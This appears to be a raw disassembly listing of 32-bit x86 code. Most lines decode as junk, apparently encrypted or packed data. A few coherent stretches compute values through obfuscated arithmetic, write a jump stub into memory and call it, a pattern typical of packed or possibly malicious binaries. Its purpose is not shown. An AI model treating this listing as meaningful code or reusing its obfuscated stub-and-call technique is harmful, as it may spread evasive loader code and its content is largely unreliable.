  40fff1:	data16 jae 0x410062
  40fff4:	mov    al,ds:0xa1f04aaf
  40fff9:	dec    edi
  40fffa:	adc    eax,0x8e86e693
  40ffff:	retf   0x8c44
  410002:	fisttp QWORD PTR ds:0xa2b8ac1a
  410008:	pusha  
  410009:	cmp    al,0xe3
  41000b:	dec    ebp
  41000c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41000d:	outs   dx,DWORD PTR ds:[esi]
  41000e:	mov    edi,0x986a08f5
  410013:	popf   
  410014:	retf   0xaf4f
  410017:	retf   0x5afa
  41001a:	inc    ebp
  41001b:	imul   ebx,DWORD PTR [ebp-0x62d342b9],0xbb299852
  410025:	out    dx,al
  410026:	and    BYTE PTR ds:0x8016b60f,dl
  41002c:	pop    ebp
  41002d:	mov    dl,0x12
  41002f:	retf   
  410030:	stos   BYTE PTR es:[edi],al
  410031:	jl     0x40ffb5
  410033:	cmc    
  410034:	fimul  WORD PTR [ebx-0xd]
  410037:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410038:	cs dec esp
  41003a:	test   al,0xfb
  41003c:	fidivr DWORD PTR [edx]
  41003e:	out    0xe4,al
  410040:	out    dx,eax
  410041:	fld    DWORD PTR [ebp-0x6d]
  410044:	mov    bh,0xed
  410046:	mov    eax,ds:0x6424940d
  41004b:	das    
  41004c:	mov    esp,esi
  41004e:	lea    ebx,[eax]
  410050:	(bad)  
  410051:	das    
  410052:	mov    al,ds:0xfab45416
  410057:	push   0x6c
  410059:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41005a:	or     ch,bh
  41005c:	imul   edi,ebp,0xd99b0212
  410062:	fidivr WORD PTR [edi+0x6e]
  410065:	int3   
  410066:	adc    ebp,edi
  410068:	mov    cl,BYTE PTR [ecx]
  41006a:	push   esp
  41006b:	push   cs
  41006c:	sbb    BYTE PTR ds:[eax+0x29],dl
  410070:	imul   esp,DWORD PTR [edi+0x3d523f81],0x52072203
  41007a:	dec    ecx
  41007b:	sbb    al,0x32
  41007d:	inc    ecx
  41007e:	pop    es
  41007f:	sbb    eax,0x36e92571
  410084:	fidivr DWORD PTR [eax+0x62e42b81]
  41008a:	fwait
  41008b:	dec    ecx
  41008c:	ret    
  41008d:	jmp    0x410050
  41008f:	dec    eax
  410090:	xchg   esp,eax
  410091:	mov    dh,0x36
  410093:	je     0x410038
  410095:	inc    esp
  410096:	xchg   BYTE PTR [ebp+0x4c62a234],ah
  41009c:	addr16 dec edi
  41009e:	jnp    0x41011d
  4100a0:	arpl   dx,dx
  4100a2:	push   esp
  4100a3:	outs   dx,BYTE PTR ds:[esi]
  4100a4:	mov    ebp,DWORD PTR [edi+eax*1]
  4100a7:	xchg   esp,eax
  4100a8:	add    eax,0x8b715071
  4100ad:	jmp    0x410108
  4100af:	jno    0x410045
  4100b1:	or     DWORD PTR [esi+0x2f],edi
  4100b4:	lock outs dx,BYTE PTR ds:[esi]
  4100b6:	int3   
  4100b7:	stos   BYTE PTR es:[edi],al
  4100b8:	or     bh,BYTE PTR [edx-0x69]
  4100bb:	jnp    0x41004e
  4100bd:	xchg   esp,eax
  4100be:	pop    ecx
  4100bf:	jbe    0x410087
  4100c1:	rcl    DWORD PTR [esi+edx*4],0x25
  4100c5:	es stos DWORD PTR es:[edi],eax
  4100c7:	adc    al,0x9b
  4100c9:	sbb    DWORD PTR [esi-0x53cb3df5],esi
  4100cf:	std    
  4100d0:	push   0x46d23d03
  4100d5:	push   0xffffffca
  4100d7:	pop    es
  4100d8:	add    al,0x93
  4100da:	in     al,0x56
  4100dc:	push   es
  4100dd:	sahf   
  4100de:	not    bh
  4100e0:	pop    ebx
  4100e1:	rcl    DWORD PTR cs:[eiz*2+0x5174c9e4],1
  4100e9:	aas    
  4100ea:	mov    ds:0x5e7e3cf7,al
  4100ef:	add    DWORD PTR [ebx],esi
  4100f1:	pop    eax
  4100f2:	(bad)  
  4100f3:	mov    bl,0x96
  4100f5:	popa   
  4100f6:	(bad)  
  4100f7:	push   ebp
  4100f8:	mov    eax,DWORD PTR [edx-0x1e]
  4100fb:	call   0x8ffb:0xd4ed945f
  410102:	(bad)  
  410103:	xor    eax,0xe0a0a5e3
  410108:	xchg   edi,eax
  410109:	dec    edi
  41010a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41010b:	(bad)  
  41010c:	inc    eax
  41010d:	xchg   ebx,eax
  41010e:	and    WORD PTR [edi-0x331cf4b9],ax
  410115:	push   esp
  410116:	inc    ebp
  410117:	push   esp
  410118:	fdiv   QWORD PTR [ebx-0x5b]
  41011b:	sbb    ebx,edx
  41011d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41011e:	adc    eax,0x616528c8
  410123:	retf   
  410124:	aaa    
  410125:	test   DWORD PTR [ebx],esp
  410127:	inc    edx
  410128:	arpl   WORD PTR [ebx+0x5261f008],ax
  41012e:	test   eax,0x2582519a
  410133:	sub    dl,bl
  410135:	stos   DWORD PTR es:[edi],eax
  410136:	add    BYTE PTR [ebp+0x5711b3a9],ah
  41013c:	(bad)  
  41013d:	adc    DWORD PTR [eax+0x50503409],edi
  410143:	dec    esi
  410144:	jns    0x410176
  410146:	(bad)  
  410148:	jp     0x4100fd
  41014a:	and    eax,0xbd8e55f5
  41014f:	imul   esp,esi,0x6178158e
  410155:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410156:	nop
  410157:	in     eax,0xa7
  410159:	mov    ah,0xe
  41015b:	jno    0x410134
  41015d:	aad    0x8
  41015f:	aaa    
  410160:	mov    eax,ds:0x51a2658c
  410165:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410166:	push   eax
  410167:	(bad)  
  410168:	xchg   ecx,eax
  410169:	imul   ebp,DWORD PTR [esi-0x51],0x11889671
  410170:	arpl   WORD PTR [ebp-0xe71fcea],sp
  410176:	js     0x4101ca
  410178:	imul   esi,DWORD PTR [ebx],0xffffffd0
  41017b:	mov    esi,0x974f9674
  410180:	bound  edi,QWORD PTR [edx+0x3e]
  410183:	je     0x410156
  410185:	imul   ebp,DWORD PTR [eax-0x61],0x7199a0
  41018c:	test   eax,0xc2b61707
  410191:	sbb    al,0xe
  410193:	push   0x76ddf626
  410198:	fdivp  st(1),st
  41019a:	cwde   
  41019b:	mov    eax,ds:0xd66fc221
  4101a0:	xor    ebx,esp
  4101a2:	and    dh,BYTE PTR [eax-0x5a6f7a33]
  4101a8:	mov    bl,0x8a
  4101aa:	jae    0x4101f7
  4101ac:	xor    eax,0x55aa64df
  4101b1:	push   edi
  4101b2:	call   0xe863480e
  4101b7:	pushf  
  4101b8:	cdq    
  4101b9:	das    
  4101ba:	fcmovb st,st(5)
  4101bc:	xchg   esp,eax
  4101bd:	in     eax,dx
  4101be:	jnp    0x41016d
  4101c0:	jecxz  0x410166
  4101c2:	fldenv [ecx]
  4101c4:	and    al,0x58
  4101c6:	sbb    edx,DWORD PTR [esi+0xfd74831]
  4101cc:	js     0x41019e
  4101ce:	cwde   
  4101cf:	out    dx,eax
  4101d0:	les    eax,FWORD PTR [ebp+0x671e4da1]
  4101d6:	stos   DWORD PTR es:[edi],eax
  4101d7:	neg    ebp
  4101d9:	mov    edx,0x7e91e1b2
  4101de:	cmc    
  4101df:	fist   WORD PTR [edi]
  4101e1:	xor    al,al
  4101e3:	mov    bl,0xaf
  4101e5:	shl    BYTE PTR [eax],1
  4101e7:	(bad)  
  4101e8:	mov    edx,0x478fb686
  4101ed:	imul   ecx,ecx,0xffffffe6
  4101f0:	mov    edi,0xeb48e585
  4101f5:	icebp  
  4101f6:	mov    al,ds:0x9582d148
  4101fb:	or     esi,DWORD PTR [ebp+0x6]
  4101fe:	adc    dl,BYTE PTR [ecx-0x4c]
  410201:	sbb    esp,DWORD PTR [esi-0x18]
  410204:	loopne 0x4101ac
  410206:	or     al,0x53
  410208:	ret    
  410209:	dec    esi
  41020a:	sub    eax,0x5750581c
  41020f:	jns    0x410283
  410211:	mov    cl,0xa9
  410213:	adc    edi,DWORD PTR [edx]
  410215:	(bad)  
  410216:	lahf   
  410217:	mov    esi,0xd3e3e60a
  41021c:	cdq    
  41021d:	mov    BYTE PTR [esi+edx*1+0x2e6b8fd],bh
  410224:	jne    0x41065f
  41022a:	mov    ecx,DWORD PTR [ebp-0x78]
  41022d:	xor    edx,edx
  41022f:	mov    eax,0x209c
  410234:	div    ecx
  410236:	mov    ecx,DWORD PTR ds:0x422518
  41023c:	mov    ecx,DWORD PTR [ecx+0x1a8]
  410242:	xor    edx,edx
  410244:	sub    ecx,eax
  410246:	mov    eax,DWORD PTR [ebp-0x4c]
  410249:	xor    eax,0x3daa
  41024e:	sub    eax,0x3375
  410253:	or     eax,0x6931
  410258:	lea    eax,[ebp+eax*1-0x6c25]
  41025f:	push   eax
  410260:	mov    eax,DWORD PTR [ebp-0x8c]
  410266:	push   0x18
  410268:	pop    esi
  410269:	div    esi
  41026b:	mov    esi,DWORD PTR [ebp-0x60]
  41026e:	xor    edx,edx
  410270:	div    esi
  410272:	mov    edx,DWORD PTR [ebp-0x44]
  410275:	mov    esi,DWORD PTR [ebp-0x34]
  410278:	xor    eax,edx
  41027a:	xor    edx,edx
  41027c:	div    esi
  41027e:	imul   eax,eax,0x7d2a
  410284:	sub    eax,0x928ded7
  410289:	push   eax
  41028a:	mov    eax,ds:0x422518
  41028f:	add    eax,0xaa
  410294:	push   eax
  410295:	mov    eax,DWORD PTR [ebp-0x3c]
  410298:	sub    ecx,eax
  41029a:	mov    eax,DWORD PTR [ebp-0x24]
  41029d:	push   DWORD PTR [ecx+eax*1+0xbd4]
  4102a4:	call   0x41e9f9
  4102a9:	mov    DWORD PTR [ebp-0x4],eax
  4102ac:	mov    ecx,DWORD PTR ds:0x422620
  4102b2:	lea    eax,[ebp+0x4]
  4102b5:	mov    DWORD PTR [ecx*4+0x422618],eax
  4102bc:	inc    DWORD PTR ds:0x422620
  4102c2:	mov    eax,DWORD PTR [ebp-0x4]
  4102c5:	mov    eax,DWORD PTR [ebp-0x4]
  4102c8:	xor    edx,edx
  4102ca:	shld   edx,eax,0x2
  4102ce:	shl    eax,0x2
  4102d1:	mov    ecx,0xca79a575
  4102d6:	mov    esi,0x9c1b89e8
  4102db:	xor    eax,ecx
  4102dd:	xor    edx,esi
  4102df:	cmp    eax,ecx
  4102e1:	jne    0x4105c9
  4102e7:	cmp    edx,esi
  4102e9:	jne    0x4105c9
  4102ef:	mov    eax,0xca79a571
  4102f4:	mov    edx,esi
  4102f6:	jmp    0x410669
  4102fb:	jmp    0x4105c9
  410300:	sbb    al,0xfc
  410302:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410303:	fs sbb bl,BYTE PTR es:[edx]
  410307:	mov    ebp,0x70cf8d86
  41030c:	push   es
  41030d:	adc    al,0x39
  41030f:	push   0xffffffc3
  410311:	xchg   edx,eax
  410312:	sbb    BYTE PTR [eax],bl
  410314:	mov    esi,0x7181814
  410319:	in     eax,dx
  41031a:	mov    WORD PTR [esi],fs
  41031c:	ror    al,1
  41031e:	mov    ah,0xec
  410320:	cmp    cl,al
  410322:	dec    ebp
  410323:	mov    DWORD PTR [edi-0x3bc7ba00],ebx
  410329:	sbb    DWORD PTR [ebx+0x63],ecx
  41032c:	out    dx,al
  41032d:	mov    ss,WORD PTR [esi]
  41032f:	cld    
  410330:	jo     0x41036c
  410332:	cmp    al,0xc3
  410334:	test   eax,0x4b3c0151
  410339:	jno    0x4102c2
  41033b:	fdiv   QWORD PTR [eax-0x267a64a]
  410341:	imul   ebx,DWORD PTR [edi-0x6d],0xc24e050
  410348:	xor    eax,0xaf325efe
  41034d:	imul   ebp,DWORD PTR [edi],0x7a
  410350:	cmp    eax,0xf9f17377
  410355:	cmp    cl,bh
  410357:	xchg   edx,eax
  410358:	add    ecx,DWORD PTR [edi-0x606c423d]
  41035e:	mov    al,0x2
  410360:	(bad)  
  410361:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410362:	es enter 0x1344,0x5c
  410367:	add    ecx,DWORD PTR [ebx]
  410369:	and    BYTE PTR [esi+ebp*8-0x2f],dl
  41036d:	inc    ebp
  41036e:	hlt    
  41036f:	add    ah,BYTE PTR [ecx]
  410371:	mov    al,0xf6
  410373:	jle    0x41039d
  410375:	mov    ebx,0x4926f754
  41037a:	data16 sar BYTE PTR [esi+edi*2+0x39],cl
  41037f:	inc    ebx
  410380:	js     0x4103eb
  410382:	cdq    
  410383:	imul   esi,edx,0x3e9fc93e
  410389:	add    ebp,DWORD PTR [edx+0x6]
  41038c:	jne    0x41039d
  41038e:	jle    0x4103a5
  410390:	pop    ds
  410391:	fldcw  WORD PTR [esi]
  410393:	out    0xbc,al
  410395:	push   ebx
  410396:	ins    BYTE PTR es:[edi],dx
  410397:	ffree  st(3)
  410399:	aam    0xda
  41039b:	mov    ecx,eax
  41039d:	in     al,0xe
  41039f:	add    esi,DWORD PTR [ecx]
  4103a1:	loope  0x41032c
  4103a3:	jmp    0x4103c4
  4103a5:	mov    al,0x75
  4103a7:	ss mov ch,0x67
  4103aa:	mov    al,0x48
  4103ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4103ad:	(bad)  
  4103ae:	jno    0x4103c4
  4103b0:	jmp    0xdbc8:0xc7ba2cc
  4103b7:	ins    BYTE PTR es:[edi],dx
  4103b8:	cmp    ecx,0x2a3e3546
  4103be:	test   DWORD PTR [edx+0x22e1d6fb],ecx
  4103c4:	mov    cl,0x5
  4103c6:	scas   eax,DWORD PTR es:[edi]
  4103c7:	cmp    eax,0xfbe1a63b
  4103cc:	rol    BYTE PTR [edi-0x6c],1
  4103cf:	inc    esp
  4103d0:	mov    esp,DWORD PTR [edx]
  4103d2:	adc    esp,DWORD PTR [eax]
  4103d4:	int    0x71
  4103d6:	arpl   WORD PTR [ecx+0x65],si
  4103d9:	xchg   edi,eax
  4103da:	ins    DWORD PTR es:[edi],dx
  4103db:	retf   0x7ef9
  4103de:	repnz adc DWORD PTR [eax-0xd],eax
  4103e2:	sbb    eax,0x416e0782
  4103e7:	and    eax,DWORD PTR [esi]
  4103e9:	loopne 0x4103f6
  4103eb:	push   ds
  4103ec:	push   0xffffffc5
  4103ee:	pop    edx
  4103ef:	dec    ecx
  4103f0:	in     eax,0x43
  4103f2:	test   al,0xc4
  4103f4:	push   esi
  4103f5:	lods   eax,DWORD PTR ds:[esi]
  4103f6:	aad    0x1f
  4103f8:	sbb    al,BYTE PTR [eax+0x44]
  4103fb:	adc    eax,0x768fca74
  410400:	test   BYTE PTR [edx+edi*1],0x9b
  410404:	dec    edi
  410405:	mov    ebx,DWORD PTR [esi-0x11225119]
  41040b:	fidivr DWORD PTR [eax]
  41040d:	mov    ebx,0x5f61510e
  410412:	test   DWORD PTR [eax],edx
  410414:	mov    cl,0x17
  410416:	push   edi
  410417:	pop    ecx
  410418:	mul    DWORD PTR [ebx]
  41041a:	test   BYTE PTR [ebx],0xe4
  41041d:	addr16 leave 
  41041f:	lods   al,BYTE PTR ds:[esi]
  410420:	jle    0x41047d
  410422:	and    edi,edi
  410424:	into   
  410425:	dec    eax
  410426:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410427:	clc    
  410428:	or     ch,BYTE PTR cs:[edx+0x4be50d90]
  41042f:	fiadd  WORD PTR [edx]
  410431:	sbb    esp,DWORD PTR [edi-0x49]
  410434:	push   es
  410435:	jno    0x410464
  410437:	dec    ebp
  410438:	add    DWORD PTR [esi+eax*4+0x1c5ade7e],ecx
  41043f:	and    bl,BYTE PTR [edx+0x7ec907af]
  410445:	sar    BYTE PTR [ecx+0xe],1
  410448:	lds    edx,FWORD PTR [esi+0x40686a12]
  41044e:	sub    al,0x9
  410450:	dec    edx
  410451:	rol    BYTE PTR [eax+ebx*1+0xd],1
  410455:	push   eax
  410456:	bound  edx,QWORD PTR ds:0x8abe82dd
  41045c:	(bad)  
  41045d:	bound  ebp,QWORD PTR [esp+ebp*8-0x60c6e4c5]
  410464:	dec    edx
  410465:	pop    ebp
  410466:	in     al,0xb3
  410468:	mov    ecx,0xe1c204d3
  41046d:	loope  0x410428
  41046f:	jns    0x41047c
  410471:	xchg   ebp,eax
  410472:	hlt    
  410473:	imul   ebp,DWORD PTR [ebx+0x74fe924e],0x5db995ad
  41047d:	inc    esi
  41047e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41047f:	sahf   
  410480:	test   DWORD PTR [edi],esp
  410482:	push   ebx
  410483:	(bad)  
  410485:	leave  
  410486:	and    ebp,DWORD PTR [edi]
  410488:	data16 daa 
  41048a:	adc    eax,0xae300178
  41048f:	lods   eax,DWORD PTR ds:[esi]
  410490:	inc    ecx
  410491:	(bad)  
  410492:	in     al,0x28
  410494:	cld    
  410495:	sbb    al,BYTE PTR [ecx+0x34752e2b]
  41049b:	sbb    DWORD PTR [eax-0x33],0x527a7f04
  4104a2:	sti    
  4104a3:	call   0x9cdfd147
  4104a8:	ins    DWORD PTR es:[edi],dx
  4104a9:	mov    cl,0xb
  4104ab:	mov    eax,0x17dab0a2
  4104b0:	ret    
  4104b1:	icebp  
  4104b2:	sub    esi,DWORD PTR [eax-0x6a]
  4104b5:	call   0xcd13:0xaccc6b38
  4104bc:	(bad)  
  4104bd:	rol    DWORD PTR [ecx-0x3fa7cf01],cl
  4104c3:	inc    ebx
  4104c4:	jp     0x41044f
  4104c6:	(bad)  
  4104c7:	xor    ch,BYTE PTR [edx]
  4104c9:	jl     0x410475
  4104cb:	je     0x41048e
  4104cd:	xchg   edx,eax
  4104ce:	test   BYTE PTR ds:0x6e904614,al
  4104d4:	mov    ebx,0x7f301c3f
  4104d9:	test   BYTE PTR [edi],al
  4104db:	push   ecx
  4104dc:	(bad)  
  4104dd:	hlt    
  4104de:	(bad)  
  4104df:	ret    
  4104e0:	shl    BYTE PTR [ebx+eax*2],1
  4104e3:	inc    edi
  4104e4:	les    esi,FWORD PTR [edx+0x2377a2cf]
  4104ea:	inc    edx
  4104eb:	mov    esp,0xd64e0128
  4104f0:	aam    0xf6
  4104f2:	fdivr  QWORD PTR [edi+0x6a]
  4104f5:	push   esp
  4104f6:	sub    DWORD PTR [edi+0x7082312d],0xb
  4104fd:	dec    ecx
  4104fe:	mov    ds,WORD PTR [ecx]
  410500:	sub    al,0x7d
  410502:	shr    dh,0x69
  410505:	xchg   edx,esi
  410507:	adc    BYTE PTR [eax+0x77],ah
  41050a:	frstor ds:0x4d12537e
  410510:	ins    DWORD PTR es:[edi],dx
  410511:	pushf  
  410512:	fdivr  QWORD PTR [ebx-0x4c94807b]
  410518:	dec    edi
  410519:	mov    ah,0x4c
  41051b:	push   esp
  41051c:	ret    0xf8f8
  41051f:	sbb    ch,dl
  410521:	xor    DWORD PTR fs:[edx+0x2c887883],0x8ca4f837
  41052c:	out    dx,eax
  41052d:	popa   
  41052e:	ss inc ebp
  410530:	inc    edx
  410531:	imul   ecx,eax,0x21
  410534:	mov    bl,0xac
  410536:	(bad)  
  410537:	dec    edi
  410538:	lods   al,BYTE PTR ds:[esi]
  410539:	retf   0xbfc5
  41053c:	pop    ebp
  41053d:	fcom   st(2)
  41053f:	pop    ds
  410540:	fdivr  DWORD PTR [ecx-0xf8d5bd4]
  410546:	cwde   
  410547:	cmp    DWORD PTR [eax+0xa5499eb],ebx
  41054d:	mov    edx,DWORD PTR [edx+eiz*2-0x43]
  410551:	int    0x14
  410553:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410554:	and    al,0x13
  410556:	adc    eax,0x803e01a2
  41055b:	cmp    eax,0x7ba264ed
  410560:	and    BYTE PTR [ecx-0x72],ah
  410563:	or     edi,ecx
  410565:	std    
  410566:	dec    esp
  410567:	addr16 clc 
  410569:	cmp    eax,0x42a6049f
  41056e:	cs xchg bp,ax
  410571:	popf   
  410572:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410573:	and    BYTE PTR [eax+edx*8-0x57],cl
  410577:	adc    al,BYTE PTR [edx+0x2f2eaded]
  41057d:	lea    eax,[eax-0x63656600]
  410583:	aam    0xff
  410585:	sbb    edx,edx
  410587:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410588:	test   BYTE PTR ds:0x43d327dc,cl
  41058e:	(bad)  
  410590:	rol    BYTE PTR [edx-0x65ac212a],1
  410596:	or     ch,BYTE PTR [eax-0x55f08ea3]
  41059c:	iret   
  41059d:	mov    esi,0x99cab457
  4105a2:	mov    esi,0x4551632e
  4105a7:	push   ebp
  4105a8:	out    dx,eax
  4105a9:	mov    ebx,0xdd65c6bd
  4105ae:	sub    eax,0xbe4246e4
  4105b3:	imul   esp,DWORD PTR [ebp-0x18521da8],0x42115897
  4105bd:	push   ecx
  4105be:	out    0x3d,eax
  4105c0:	mov    bh,ch
  4105c2:	jp     0x410590
  4105c4:	es pop edx
  4105c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105c7:	in     al,0xe2
  4105c9:	lea    eax,[ebp-0x10]
  4105cc:	mov    DWORD PTR [ebp-0x9c],eax
  4105d2:	mov    eax,DWORD PTR [ebp-0x54]
  4105d5:	mov    DWORD PTR [ebp-0x10],eax
  4105d8:	mov    eax,DWORD PTR [ebp-0x10]
  4105db:	mov    ecx,DWORD PTR [ebp-0x4]
  4105de:	sub    eax,ecx
  4105e0:	mov    DWORD PTR [ebp-0x10],eax
  4105e3:	mov    eax,DWORD PTR [ebp-0x20]
  4105e6:	mov    ecx,DWORD PTR [ebp-0x1c]
  4105e9:	sub    DWORD PTR [ebp-0x10],eax
  4105ec:	mov    eax,DWORD PTR [ebp-0x4]
  4105ef:	mov    DWORD PTR [eax],0x658776e9
  4105f5:	mov    DWORD PTR [eax+0x4],0xab756547
  4105fc:	mov    eax,DWORD PTR [ebp-0x10]
  4105ff:	mov    ecx,DWORD PTR [ebp-0x4]
  410602:	mov    DWORD PTR [ecx+0x1],eax
  410605:	mov    eax,ds:0x422394
  41060a:	push   DWORD PTR [eax]
  41060c:	push   DWORD PTR ds:0x422608
  410612:	push   DWORD PTR ds:0x42239c
  410618:	push   DWORD PTR ds:0x4225e8
  41061e:	push   DWORD PTR ds:0x42265c
  410624:	push   0xa4069aaa
  410629:	push   0xa4069aae
  41062e:	push   DWORD PTR [ebp-0x5c]
  410631:	mov    eax,DWORD PTR [ebp-0x4]
  410634:	call   eax
  410636:	mov    eax,DWORD PTR [edi]
  410638:	mov    eax,DWORD PTR [ebp+0x8]
  41063b:	push   DWORD PTR [eax]
  41063d:	call   0x4110ff
  410642:	mov    eax,ds:0x422518
  410647:	push   0x4
  410649:	add    eax,0x1dc
  41064e:	push   eax
  41064f:	push   edi
  410650:	call   0x415231
  410655:	mov    eax,0xca79a57d
  41065a:	jmp    0x4102f4
  41065f:	mov    eax,0xca79a575
  410664:	mov    edx,0x9c1b89e8
  410669:	pop    esi
  41066a:	pop    ebx
  41066b:	leave  
  41066c:	ret    0x4
  41066f:	push   ebp
  410670:	mov    ebp,esp
  410672:	sub    esp,0x20
  410675:	push   ebx
  410676:	push   edi
  410677:	mov    DWORD PTR [ebp-0x8],0x522e
  41067e:	mov    DWORD PTR [ebp-0x4],0x3dbd
  410685:	mov    DWORD PTR [ebp-0x10],0x53f1
  41068c:	mov    DWORD PTR [ebp-0xc],0x631b
  410693:	mov    DWORD PTR [ebp-0x18],0x524d
  41069a:	mov    DWORD PTR [ebp-0x14],0x1600
  4106a1:	mov    eax,DWORD PTR [ebp-0x18]
  4106a4:	mov    ecx,DWORD PTR [ebp-0x14]
  4106a7:	mov    edx,DWORD PTR [ebp-0x10]
  4106aa:	mov    edi,DWORD PTR [ebp-0xc]
  4106ad:	push   edi
  4106ae:	push   edx
  4106af:	push   ecx
  4106b0:	push   eax
  4106b1:	call   0x416c20
  4106b6:	mov    ecx,DWORD PTR [ebp-0x8]
  4106b9:	mov    edi,DWORD PTR [ebp-0x4]
  4106bc:	add    eax,0x1dc8
  4106c1:	adc    edx,0x6fbf
  4106c7:	and    edx,edi
  4106c9:	push   0x1061
  4106ce:	and    eax,ecx
  4106d0:	or     edx,0x23ff
  4106d6:	push   0x4000022f
  4106db:	jmp    0x4109bb
  4106e0:	pop    edi
  4106e1:	jp     0x410689
  4106e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106e4:	mov    ds:0x103a5b1c,al
  4106e9:	fsub   QWORD PTR [edi-0x44]
  4106ec:	js     0x410707
  4106ee:	gs mov esp,0x18188e68
  4106f4:	call   0x41de:0x40181814
  4106fb:	fist   WORD PTR [eax-0x49]
  4106fe:	sub    al,BYTE PTR [esi+0x1f]
  410701:	call   0xf06028c4
  410706:	clc    
  410707:	mov    edi,0x86cebf65
  41070c:	cmp    al,0x15
  41070e:	jo     0x410692
  410710:	call   0xdec0:0x6ba06250
  410717:	and    BYTE PTR [edx+ebp*1+0x22],al
  41071b:	mov    ebp,0xc94449d5
  410720:	sub    ebx,DWORD PTR [ebx]
  410722:	and    eax,0xaf164b32
  410727:	rcr    eax,cl
  410729:	push   ebp
  41072a:	inc    ecx
  41072b:	mov    WORD PTR [edx-0x1f],gs
  41072e:	ficom  DWORD PTR [ecx]
  410730:	jbe    0x410741
  410732:	(bad)  
  410734:	adc    BYTE PTR [edx-0x1d],bh
  410737:	icebp  
  410738:	xchg   BYTE PTR [edi+ebx*8-0x50],cl
  41073c:	or     edx,0x22da3ef4
  410742:	xchg   ebp,eax
  410743:	pop    eax
  410744:	fist   DWORD PTR [ebx+0x10]
  410747:	adc    BYTE PTR ds:0xfb1142d,ah
  41074d:	adc    edi,ebx
  41074f:	jnp    0x410785
  410751:	inc    esp
  410752:	jge    0x4107c5
  410754:	mov    al,0x8f
  410756:	outs   dx,DWORD PTR ds:[esi]
  410757:	loope  0x4107b2
  410759:	and    BYTE PTR [edx-0x67bd2dad],ah
  41075f:	adc    cl,cl
  410761:	add    al,0x2a
  410763:	jmp    0x4106fe
  410765:	adc    ebp,DWORD PTR [ebx]
  410767:	iret   
  410768:	ss ret 0x3323
  41076c:	jae    0x41076a
  41076e:	and    esp,DWORD PTR [eax-0x6fbd8784]
  410774:	adc    al,0x1c
  410776:	shl    DWORD PTR [edi],cl
  410778:	das    
  410779:	dec    edi
  41077a:	and    bh,BYTE PTR [ecx+0xa]
  41077d:	inc    esi
  41077e:	aaa    
  41077f:	mov    bh,0xdb
  410781:	lahf   
  410782:	hlt    
  410783:	arpl   bx,dx
  410785:	dec    esi
  410786:	pop    ss
  410787:	pop    edx
  410788:	mov    DWORD PTR [edi-0x45],edx
  41078b:	enter  0xea04,0x2a
  41078f:	sbb    ah,BYTE PTR [edx-0x18]
  410792:	cli    
  410793:	mov    cl,0xcb
  410795:	(bad)
  410798:	dec    ebp
  410799:	pop    edx
  41079a:	stc    
  41079b:	gs (bad) 
  41079d:	mov    eax,ds:0xc396410b
  4107a2:	pop    ecx
  4107a3:	mov    edx,0x702696a6
  4107a8:	jmp    0x410811
  4107aa:	xchg   BYTE PTR [esi+0x57],dl
  4107ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107ae:	jns    0x410765
  4107b0:	sbb    eax,0x91c64352
  4107b5:	push   0xffffffc0
  4107b7:	jl     0x410781
  4107b9:	lahf   
  4107ba:	sbb    esi,DWORD PTR [esi]
  4107bc:	jl     0x410743
  4107be:	into   
  4107bf:	pop    ebp
  4107c0:	jnp    0x41077a
  4107c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107c3:	enter  0x29a3,0x43
  4107c7:	adc    eax,0xf16365e7
  4107cc:	xor    eax,0xe3051062
  4107d1:	mov    ds:0xd3aa2d57,al
  4107d6:	xchg   esi,eax
  4107d7:	arpl   WORD PTR [edx],di
  4107d9:	nop
  4107da:	lea    esi,[ecx+0x4ef9a9cf]
  4107e0:	jne    0x410846
  4107e2:	(bad)  
  4107e3:	shl    BYTE PTR [ebp+0x2aa7688f],1
  4107e9:	and    esp,DWORD PTR [ebx-0x5a]
  4107ec:	push   esi
  4107ed:	xor    eax,0x87d503d1
  4107f2:	adc    DWORD PTR [esi],0x38
  4107f5:	cmc    
  4107f6:	into   
  4107f7:	mov    bl,BYTE PTR [eax]
  4107f9:	xor    bl,BYTE PTR [ecx+0x9742add]
  4107ff:	es test eax,0x8a02e09e
  410805:	das    
  410806:	and    BYTE PTR [ecx+0x45],dh
  410809:	sbb    DWORD PTR [edx-0x1f7aba59],edx
  41080f:	jnp    0x410814
  410811:	sti    
  410812:	push   ebp
  410813:	xchg   BYTE PTR [edx+0x68],dh
  410816:	mov    ebp,0x22cb961b
  41081b:	das    
  41081c:	pop    es
  41081d:	aad    0xbd
  41081f:	pop    ss
  410820:	lods   eax,DWORD PTR ds:[esi]
  410821:	imul   edx,DWORD PTR [eax],0xcb9e0459
  410827:	fidiv  DWORD PTR [ecx]
  410829:	sbb    eax,0x2dde9b37
  41082e:	lods   eax,DWORD PTR ds:[esi]
  41082f:	pop    ebp
  410830:	xor    al,BYTE PTR ds:0x5b032c5a
  410836:	cwde   
  410837:	dec    edi
  410838:	fdiv   DWORD PTR [ebx-0x79e59d4d]
  41083e:	mov    eax,ds:0xd7fe20ca
  410843:	dec    esp
  410844:	mov    ebp,0xa4a5c1c8
  410849:	(bad)  
  41084b:	sbb    eax,0x198eae53
  410850:	mov    WORD PTR [ebp+0x7de2972a],fs
  410856:	mov    eax,gs:0xed3467ad
  41085c:	lds    esp,FWORD PTR [edx]
  41085e:	aam    0x50
  410860:	dec    eax
  410861:	call   0x60b0dc4b
  410866:	sbb    eax,0xdcdb864
  41086b:	or     DWORD PTR [ebx+0x4c3ac4b2],0xfffffffd
